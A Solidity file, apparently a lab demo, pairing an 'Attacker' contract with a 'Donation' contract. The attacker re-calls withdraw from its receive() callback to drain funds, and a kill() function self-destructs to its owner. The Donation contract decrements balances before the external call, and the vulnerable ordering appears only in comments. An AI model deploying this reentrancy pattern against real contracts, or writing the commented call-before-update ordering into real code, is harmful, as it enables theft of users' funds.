// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Donation.sol";

contract Attacker {

    address payable owner;
    Donation public donation;
    uint256 public v = 0.5 ether;

    constructor(address payable _addr) payable {
        owner = payable(msg.sender);
        donation = Donation(_addr);
    }

    function donate() external {
        donation.donate{value: v}(address(this));
    }

    receive() external payable {

        if (address(donation).balance >= v ) {
            donation.withdraw(v);
        }
    }

    function kill() external {
        selfdestruct(owner);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

}


contract Donation {

    mapping(address => uint256) balances;

    function donate(address _to) public payable {
        balances[_to] += msg.value;
    }

    function balanceOf(address _addr) public view returns (uint balance) {
        return balances[_addr];
    }

    function withdraw(uint256 _amount) public {

        if (balances[msg.sender] >= _amount) {

        unchecked{ balances[msg.sender] -= _amount; }
            //payable(msg.sender).transfer(_amount);

            //(bool bOk, ) = msg.sender.call{value: _amount}("");
            (bool bOk, ) = msg.sender.call{value: _amount}(abi.encodeWithSelector(""));
            if (!bOk) {
                revert();
            }

            //unchecked{ balances[msg.sender] -= _amount; }
        }
    }

    receive() external payable {}

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

